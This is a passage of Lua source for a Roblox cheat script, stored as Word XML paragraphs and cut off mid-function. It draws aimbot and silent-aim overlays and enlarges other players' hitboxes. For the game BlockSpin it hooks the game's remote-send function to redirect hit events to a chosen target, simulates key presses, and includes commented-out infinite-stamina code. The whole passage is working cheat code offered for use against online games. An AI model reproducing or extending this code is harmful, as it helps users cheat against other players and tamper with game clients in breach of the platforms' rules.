    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfView.NumSides = Config.Aimlock.Sides</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfView.Position = MouseLocation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfView.NumSides = Config.Aimlock.Sides</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfViewOutline.NumSides = Config.Aimlock.Sides</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfViewOutline.Radius = AimbotFieldOfView.Radius</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfViewOutline.Position = AimbotFieldOfView.Position</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfViewOutline.Visible = AimbotFieldOfView.Visible</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfViewFill.Visible = AimbotFieldOfView.Visible</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfViewFill.NumSides = AimbotFieldOfView.NumSides</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfViewFill.Color = AimbotFieldOfView.Color</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfViewFill.Radius = AimbotFieldOfView.Radius</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfViewFill.Position = AimbotFieldOfView.Position</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotFieldOfViewFill.Transparency = Config.Aimlock.FieldOfViewTransparency</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfView.Visible = Config.Silent.Enabled and Config.Silent.UseFieldOfView and Config.Silent.DrawFieldOfView</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfView.Radius = Config.Silent.Radius</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfView.NumSides = Config.Silent.Sides</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfView.Color = Config.Silent.FieldOfViewColor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfView.NumSides = Config.Silent.Sides</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfView.Position = MouseLocation</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfViewFill.Visible = SilentFieldOfView.Visible</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfViewFill.NumSides = SilentFieldOfView.NumSides</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfViewFill.Color = SilentFieldOfView.Color</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfViewFill.Radius = SilentFieldOfView.Radius</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfViewFill.Position = SilentFieldOfView.Position</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfViewFill.Transparency = Config.Silent.FieldOfViewTransparency</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfViewOutline.NumSides = Config.Silent.Sides</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfViewOutline.Position = SilentFieldOfView.Position</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfViewOutline.Visible = SilentFieldOfView.Visible</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentFieldOfViewOutline.Radius = SilentFieldOfView.Radius</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentSnapline.Visible = (Config.Silent.Enabled == true) and (Config.Silent.Targetting == true) and Config.Silent.Snapline and (SilentTarget ~= nil)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentSnapline.Color = Config.Silent.SnaplineColor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentSnapline.Thickness = Config.Silent.SnaplineThickness;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentSnaplineOutline.Thickness = Config.Silent.SnaplineThickness + 2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SilentSnaplineOutline.Visible = SilentSnapline.Visible</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotSnapline.Color = Config.Aimlock.SnaplineColor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotSnapline.Visible = (Config.Aimlock.Enabled == true) and (Config.Aimlock.Aiming == true) and Config.Aimlock.Snapline and (AimlockTarget ~= nil)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotSnapline.Thickness = Config.Aimlock.SnaplineThickness;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotSnaplineOutline.Thickness = Config.Aimlock.SnaplineThickness + 2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AimbotSnaplineOutline.Visible = AimbotSnapline.Visible</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if (not SilentTarget or not SilentTarget.Character or not SilentTarget.Character:FindFirstChild("Head")) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                SilentSnapline.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if (not AimlockTarget or not AimlockTarget.Character or not AimlockTarget.Character:FindFirstChild(Config.Aimlock.TargetPart)) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                AimbotSnapline.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local _Part = "Head"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if SilentTarget and SilentTarget.Character and SilentTarget.Character:FindFirstChild(_Part) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local SilentPosition, OnScreen = Camera:WorldToViewportPoint(SilentTarget.Character:FindFirstChild(_Part).Position)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                SilentSnapline.Visible = (Config.Silent.Snapline and SilentTarget and OnScreen)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                SilentSnapline.Visible = SilentSnapline.Visible</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if (SilentSnapline.Visible and OnScreen) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SilentSnapline.From = MouseLocation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SilentSnaplineOutline.From = SilentSnapline.From</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SilentSnapline.To = Vector2.new(SilentPosition.X, SilentPosition.Y)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SilentSnaplineOutline.To = SilentSnapline.To</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if AimlockTarget and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(Config.Aimlock.TargetPart) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local AimlockPosition, OnScreen = Camera:WorldToViewportPoint(AimlockTarget.Character:FindFirstChild(Config.Aimlock.TargetPart).Position)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                AimbotSnapline.Visible = (Config.Aimlock.Snapline and AimlockTarget and OnScreen)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                AimbotSnaplineOutline.Visible = AimbotSnapline.Visible</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if (AimbotSnapline.Visible and OnScreen) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AimbotSnapline.From = MouseLocation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AimbotSnaplineOutline.From = AimbotSnapline.From</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AimbotSnapline.To = Vector2.new(AimlockPosition.X, AimlockPosition.Y)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AimbotSnaplineOutline.To = AimbotSnapline.To</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not LocalPlayer.Character then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            LocalPlayer.CharacterAdded:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local ConnectHitboxToPlayer = function(Player)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while (Player ~= nil) and task.wait(0.25) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Player.Character then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Player.Character then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Player.Character:FindFirstChild("HumanoidRootPart") or not Player.Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Player.Character:FindFirstChild("Head") or not Player.Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local HumanoidRootPart, Head, Humanoid = Player.Character:FindFirstChild("HumanoidRootPart"), Player.Character:FindFirstChild("Head"), Player.Character:FindFirstChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Humanoid.Sit and not DefaultPlayerSettings[Player.Name] then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not DefaultPlayerSettings[Player.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name] = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].HeadSettings = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].RootSettings = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].HeadSettings.Size = Head.Size</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].HeadSettings.Color = Head.Color</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].HeadSettings.Massless = Head.Massless</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].HeadSettings.CanCollide = Head.CanCollide</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].HeadSettings.Material = Head.Material</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].HeadSettings.Transparency = Head.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].RootSettings.Size = HumanoidRootPart.Size</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].RootSettings.Color = HumanoidRootPart.Color</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].RootSettings.Massless = HumanoidRootPart.Massless</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].RootSettings.CanCollide = HumanoidRootPart.CanCollide</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].RootSettings.Material = HumanoidRootPart.Material</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].RootSettings.Transparency = HumanoidRootPart.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            DefaultPlayerSettings[Player.Name].RootSettings.Shape = HumanoidRootPart.Shape</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Config.MiscSettings.Hitbox_Expander.Enabled or Humanoid.Sit or Humanoid.Health == 0 or table.find(library.whitelist, Player.Name) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            for Index, Value in DefaultPlayerSettings[Player.Name].RootSettings do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                HumanoidRootPart[Index] = Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            for Index, Value in DefaultPlayerSettings[Player.Name].HeadSettings do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Head[Index] = Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Head:FindFirstChild("MeshPart") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Head.Mesh.MeshId = "rbxassetid://122324286573374"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Config.MiscSettings.Hitbox_Expander.Part == "Head" and Config.MiscSettings.Hitbox_Expander.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            for Index, Value in DefaultPlayerSettings[Player.Name].RootSettings do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                HumanoidRootPart[Index] = Value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if Config.MiscSettings.Hitbox_Expander.Part == "HumanoidRootPart" and Config.MiscSettings.Hitbox_Expander.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            for Index, Value in DefaultPlayerSettings[Player.Name].HeadSettings do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Head[Index] = Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Head:FindFirstChild("MeshPart") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Head.Mesh.MeshId = "rbxassetid://8635368421"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if Config.MiscSettings.Hitbox_Expander.Part == "Head" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Config.MiscSettings.Hitbox_Expander.Enabled and Humanoid.Health ~= 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Head.Size = Vector3.new(Config.MiscSettings.Hitbox_Expander.Multiplier, Config.MiscSettings.Hitbox_Expander.Multiplier, Config.MiscSettings.Hitbox_Expander.Multiplier)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Head.Transparency = Config.MiscSettings.Hitbox_Expander.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Head.Material = Enum.Material[Config.MiscSettings.Hitbox_Expander.Material]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Head.Color = Config.MiscSettings.Hitbox_Expander.Color</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Head.CanCollide = not DefaultPlayerSettings[Player.Name].HeadSettings.CanCollide</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Head.Massless = not DefaultPlayerSettings[Player.Name].HeadSettings.Massless</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Head:FindFirstChild("MeshPart") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Head.Mesh.MeshId = ""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else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Config.MiscSettings.Hitbox_Expander.Enabled and Humanoid.Health ~= 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                HumanoidRootPart.Size = Vector3.new(Config.MiscSettings.Hitbox_Expander.Multiplier, Config.MiscSettings.Hitbox_Expander.Multiplier, Config.MiscSettings.Hitbox_Expander.Multiplier)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                HumanoidRootPart.Transparency = Config.MiscSettings.Hitbox_Expander.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                HumanoidRootPart.Material = Enum.Material[Config.MiscSettings.Hitbox_Expander.Material]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                HumanoidRootPart.Shape = Enum.PartType[Config.MiscSettings.Hitbox_Expander.Type]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                HumanoidRootPart.Color = Config.MiscSettings.Hitbox_Expander.Color</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                HumanoidRootPart.CanCollide = not DefaultPlayerSettings[Player.Name].RootSettings.CanCollide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end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for Index, Value in Players:GetPlayers() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Value == LocalPlayer then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Game_Name == "South Bronx" then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Game_Name == "Criminality" then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Game_Name == "Universal" then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Game_Name == "BlockSpin" then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ConnectHitboxToPlayer(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Players.PlayerAdded:Connect(function(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Game_Name == "South Bronx" then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Game_Name == "Criminality" then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Game_Name == "Universal" then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Game_Name == "BlockSpin" then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ConnectHitboxToPlayer(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        --local StaminaRegen, MaxStamina = LocalPlayer:GetAttribute("StaminaRegen"), LocalPlayer:GetAttribute("MaxStamina")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Game_Name == "BlockSpin" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            --[[local Set_Stamina = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RunService.PreRender:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.BlockSpin.LocalPlayer.InfiniteStamina then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Set_Stamina = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer:SetAttribute("StaminaRegen", math.huge)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer:SetAttribute("MaxStamina", math.huge)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Set_Stamina then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Set_Stamina = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer:SetAttribute("StaminaRegen", StaminaRegen)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer:SetAttribute("MaxStamina", MaxStamina)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end))]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local _Send; _Send = hookfunction(Send_Remote, LPH_NO_VIRTUALIZE(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Arguments = {...}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Arguments[1] == "throw_hit" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.Silent.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return _Send(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if checkcaller() or not SilentTarget or not (mathrandom(0, 100) &lt;= Config.Silent.HitChance) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return _Send(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local RandomPart = Config.Silent.TargetPart[1] and Config.Silent.TargetPart[math.random(1, #Config.Silent.TargetPart)] or "Head"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local TargetPart = SilentTarget.Character:FindFirstChild(RandomPart)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not SilentTarget.Character or not TargetPart then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return _Send(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Arguments[3] = TargetPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Arguments[4] = TargetPart.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return _Send(unpack(Arguments))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local PressKey = function(KeyCode, Duration)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    VirtualInputManager:SendKeyEvent(false, KeyCode, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    VirtualInputManager:SendKeyEvent(true, KeyCode, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(Duration)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    VirtualInputManager:SendKeyEvent(false, KeyCode, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
